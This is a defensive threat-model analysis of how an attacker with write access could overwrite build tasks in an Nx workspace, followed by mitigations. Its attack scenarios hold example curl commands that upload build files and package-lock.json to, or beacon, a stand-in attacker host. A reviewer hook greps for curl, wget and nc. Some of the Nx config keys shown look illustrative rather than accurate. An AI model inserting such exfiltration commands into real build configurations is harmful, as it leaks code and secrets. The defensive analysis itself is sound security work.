# Deep Analysis: "Overwrite Task" Attack Tree Path in an Nx Workspace

## 1. Define Objective

**Objective:** To thoroughly analyze the "Overwrite Task" attack vector within an Nx-based application, identify specific vulnerabilities and attack scenarios, assess the associated risks, and propose concrete, actionable mitigation strategies beyond the high-level suggestions provided in the initial attack tree.  This analysis aims to provide the development team with a clear understanding of *how* this attack could manifest and *what* specific steps they can take to prevent it.

## 2. Scope

This analysis focuses exclusively on the "Overwrite Task" attack path.  It considers:

*   **Target:**  Nx configuration files (e.g., `project.json`, `workspace.json`, `nx.json`, and potentially custom task configurations within individual project directories).  We will also consider build scripts and other files that define or influence task execution.
*   **Attacker Profile:**  We assume an attacker with *at least* "Intermediate" skill level, as indicated in the attack tree.  This implies some familiarity with CI/CD systems, build processes, and potentially Nx itself.  The attacker may have gained access through various means (e.g., compromised developer credentials, insider threat, supply chain attack on a dependency).  We will *not* focus on the initial access vector, but rather on what the attacker can do *after* gaining the ability to modify configuration files.
*   **Nx-Specific Considerations:**  We will leverage the unique features and potential vulnerabilities of Nx, such as its task caching, distributed task execution (if applicable), and plugin system.
*   **Exclusions:**  This analysis does *not* cover other attack vectors in the broader attack tree.  It also does not delve into general security best practices unrelated to task overwriting (e.g., network security, operating system hardening).

## 3. Methodology

The analysis will follow these steps:

1.  **Vulnerability Identification:**  Identify specific locations and mechanisms within an Nx workspace where task definitions can be modified.  This includes examining the structure of Nx configuration files and how tasks are defined and executed.
2.  **Attack Scenario Development:**  Create realistic scenarios demonstrating how an attacker could exploit the identified vulnerabilities.  These scenarios will consider different attacker motivations and access levels.
3.  **Risk Assessment:**  Re-evaluate the likelihood, impact, effort, skill level, and detection difficulty, providing more granular justifications based on the identified vulnerabilities and attack scenarios.
4.  **Mitigation Strategy Refinement:**  Expand on the initial mitigation suggestions, providing specific, actionable steps tailored to the Nx environment.  This will include concrete examples and configuration recommendations.
5.  **Tooling and Automation:**  Recommend tools and techniques that can be used to automate the detection and prevention of task overwriting attacks.

## 4. Deep Analysis of "Overwrite Task"

### 4.1 Vulnerability Identification

Nx tasks are primarily defined in the following locations:

*   **`project.json` (per project):**  The `targets` section defines the tasks (build, test, lint, etc.) for each individual project within the workspace.  This is the most likely target for an attacker.
    ```json
    {
      "name": "my-app",
      "targets": {
        "build": {
          "executor": "@nrwl/webpack:webpack", // Or a custom executor
          "options": {
            // ... build options ...
          },
          "configurations": {
            "production": {
              // ... production-specific options ...
            }
          }
        },
        "serve": {
          // ...
        }
      }
    }
    ```
*   **`workspace.json` (root):**  Can define default configurations and executors for the entire workspace.  Less likely to be directly modified, but changes here could affect all projects.
*   **`nx.json` (root):**  Contains workspace-wide configurations, including task runner options and plugin configurations.  Modifying this file could affect how tasks are executed globally.
*   **Custom Executors/Builders:**  If the project uses custom executors (defined in separate JavaScript/TypeScript files), these files themselves become potential targets.  An attacker could modify the executor's code to inject malicious commands.
* **`package.json` (per project and root):** Contains npm scripts. Nx can use npm scripts as tasks.
* **Build scripts:** Shell scripts or other executable files that are called by Nx tasks.

### 4.2 Attack Scenario Development

**Scenario 1:  Malicious Build Artifact (Common)**

1.  **Access:** Attacker gains write access to the `project.json` file of a critical application within the workspace (e.g., through a compromised developer's Git credentials).
2.  **Modification:** The attacker modifies the `build` target's `executor` or `options` to include a malicious command.  For example, they might add a post-build script that uploads the build artifact to an attacker-controlled server:
    ```json
    "build": {
      "executor": "@nrwl/webpack:webpack",
      "options": {
        // ... original options ...
        "scripts": [
          "original-build-script.sh",
          "curl -X POST -F 'file=@dist/my-app/main.js' https://attacker.com/upload" // MALICIOUS
        ]
      }
    }
    ```
3.  **Execution:**  The next time the `build` task is run (either manually or as part of a CI/CD pipeline), the malicious command is executed.
4.  **Impact:**  The attacker gains access to the application's build artifact, potentially containing sensitive code, API keys, or other valuable data.

**Scenario 2:  Dependency Poisoning via `package.json`**

1.  **Access:** Attacker gains write access to a project's `package.json` file.
2.  **Modification:** The attacker modifies an existing npm script (which is used as an Nx task) or adds a new one with a malicious command.  For example:
    ```json
    "scripts": {
      "build": "nx build my-app && curl -X POST -d \"$(cat package-lock.json)\" https://attacker.com/exfiltrate", // MALICIOUS
      "test": "nx test my-app"
    }
    ```
3.  **Execution:** When the `build` script is run (via `npm run build` or indirectly through Nx), the malicious command exfiltrates the `package-lock.json` file, revealing the project's entire dependency tree, including potentially vulnerable versions.
4.  **Impact:** The attacker gains information about the project's dependencies, which can be used to plan further attacks (e.g., exploiting known vulnerabilities in specific dependency versions).

**Scenario 3:  Custom Executor Hijack**

1.  **Access:** Attacker gains write access to the file containing a custom Nx executor.
2.  **Modification:** The attacker modifies the executor's code to include malicious logic.  This could be subtle, such as adding a small delay and a background process that exfiltrates data, or more overt, such as completely replacing the executor's functionality.
3.  **Execution:**  Any project using the compromised executor will now execute the malicious code.
4.  **Impact:**  Wide-ranging, depending on the executor's purpose and the nature of the malicious code.  Could lead to data breaches, system compromise, or denial of service.

**Scenario 4:  Targeting `nx.json` for Global Impact**

1.  **Access:** Attacker gains write access to the root `nx.json` file.
2.  **Modification:** The attacker modifies the `tasksRunnerOptions` to inject a malicious command that will be executed *before* or *after* *every* task run in the workspace.  This could be done by manipulating the `default` task runner or by adding a custom task runner with malicious pre/post-task hooks.
    ```json
    {
      "tasksRunnerOptions": {
        "default": {
          "runner": "@nrwl/workspace/tasks-runners/default",
          "options": {
            "preTask": "curl https://attacker.com/beacon" // MALICIOUS
          }
        }
      }
    }
    ```
3.  **Execution:**  Every time *any* task is run in the workspace, the malicious command is executed.
4.  **Impact:**  The attacker gains a persistent foothold in the build process and can potentially monitor or interfere with all development activities.

### 4.3 Risk Assessment (Refined)

*   **Likelihood:** **Medium-High**.  The prevalence of CI/CD pipelines and the potential for compromised developer credentials or supply chain attacks make this a realistic threat.  The "Medium" rating from the original tree is likely an underestimate, especially in larger, more complex projects.
*   **Impact:** **Very High**.  As demonstrated in the scenarios, task overwriting can lead to data breaches, code exfiltration, system compromise, and disruption of the development process.  The original rating is accurate.
*   **Effort:** **Medium**.  The attacker needs to understand the structure of Nx configuration files and how tasks are defined, but this information is readily available in the Nx documentation.  The original rating is accurate.
*   **Skill Level:** **Intermediate-Advanced**.  While basic modifications are relatively straightforward, crafting sophisticated attacks that evade detection requires a deeper understanding of Nx and potentially the underlying build tools. The original "Intermediate" is a minimum; some scenarios require more advanced skills.
*   **Detection Difficulty:** **Medium-High**.  Simple modifications might be caught by code reviews, but more subtle changes (e.g., small additions to existing scripts, modifications to custom executors) could easily be overlooked.  The original "Medium" is likely an underestimate.  Automated detection is crucial.

### 4.4 Mitigation Strategy Refinement

The initial mitigations were a good starting point, but we need to be more specific and actionable:

1.  **Strict Access Controls (Enhanced):**
    *   **Principle of Least Privilege:**  Developers should only have write access to the configuration files they *need* to modify.  Use Git branch protection rules to restrict direct commits to the `main` or `master` branch, requiring pull requests for all changes.
    *   **CI/CD Service Accounts:**  Use dedicated service accounts for CI/CD pipelines with *minimal* permissions.  These accounts should *not* have write access to the repository (except perhaps for specific, tightly controlled actions like updating build status).  The CI/CD system should *build* from a specific commit hash, not directly from a branch.
    *   **File System Permissions:**  On developer workstations and build servers, ensure that configuration files have appropriate file system permissions (e.g., read-only for most users, write access only for specific users/groups).

2.  **Code Reviews (Enhanced):**
    *   **Mandatory Pull Requests:**  Enforce a policy requiring *all* changes to configuration files to go through a pull request with at least one reviewer (preferably two).
    *   **Checklist for Reviewers:**  Provide reviewers with a specific checklist that includes items like:
        *   "Are there any unexpected changes to task definitions (executors, options, scripts)?"
        *   "Are there any new or modified npm scripts?"
        *   "Are there any changes to custom executors?"
        *   "Are there any suspicious commands (e.g., `curl`, `wget`, network connections)?"
    *   **Diff Tools:**  Encourage reviewers to use diff tools that highlight changes clearly and make it easier to spot malicious modifications.

3.  **Git Hooks (Specific Examples):**
    *   **Pre-Commit Hook:**  Implement a pre-commit hook that checks for specific patterns in configuration files (e.g., using `grep` or a more sophisticated linter) before allowing a commit.  This can prevent developers from accidentally committing malicious code. Example (basic):
        ```bash
        #!/bin/sh
        # Check for suspicious commands in project.json
        if git diff --cached --name-only | grep -q 'project.json'; then
          git diff --cached | grep -E 'curl|wget|nc' && exit 1 || exit 0
        fi
        exit 0
        ```
    *   **Pre-Push Hook:** Implement a pre-push hook on the server-side (if possible) to perform more thorough checks before accepting changes. This is a stronger defense than pre-commit hooks, as it cannot be bypassed by developers.

4.  **Configuration Management (Enhanced):**
    *   **Version Control (Git):**  This is already implied, but it's crucial to emphasize the importance of using Git for *all* configuration files and build scripts.
    *   **Infrastructure as Code (IaC):**  If the CI/CD pipeline itself is defined using IaC (e.g., using tools like Terraform, Ansible, or CloudFormation), treat the IaC configuration with the same level of security as the application code.  This prevents attackers from modifying the pipeline itself to inject malicious tasks.
    *   **Immutable Infrastructure:** Consider using immutable infrastructure principles, where build servers are created from a known-good image and destroyed after each build. This reduces the window of opportunity for an attacker to persist malicious changes.

5. **Sandboxing:** Execute tasks within isolated environments (containers, VMs) to limit the impact of a compromised task. Nx Cloud, for example, uses containers. Ensure these containers have minimal privileges.

6. **Regular Expression Monitoring:** Use tools that can monitor files for changes matching specific regular expressions. This can help detect the insertion of malicious commands.

7. **Hash Verification:** Calculate and store hashes of critical configuration files and build scripts. Regularly verify these hashes to detect unauthorized modifications.

8. **Audit Logging:** Enable detailed audit logging for all changes to configuration files and task executions. This provides a record of who made what changes and when, which is crucial for incident response.

### 4.5 Tooling and Automation

*   **Static Analysis Tools:**  Use static analysis tools (e.g., ESLint, SonarQube) with custom rules to detect suspicious patterns in configuration files and build scripts.
*   **Security Linters:**  Explore security-focused linters that can specifically identify potential vulnerabilities in shell scripts and other build-related files (e.g., ShellCheck).
*   **Dependency Analysis Tools:**  Use tools like `npm audit` or `yarn audit` to identify known vulnerabilities in project dependencies.  Integrate these tools into the CI/CD pipeline.
*   **Intrusion Detection Systems (IDS):**  Consider using an IDS to monitor for suspicious network activity and file system changes on build servers.
*   **SIEM (Security Information and Event Management):** Integrate logs from various sources (Git, CI/CD, build servers) into a SIEM system to provide a centralized view of security events and facilitate threat detection.
* **Software Composition Analysis (SCA):** Tools like Snyk, Dependabot (for GitHub), or OWASP Dependency-Check can scan dependencies and flag known vulnerabilities.
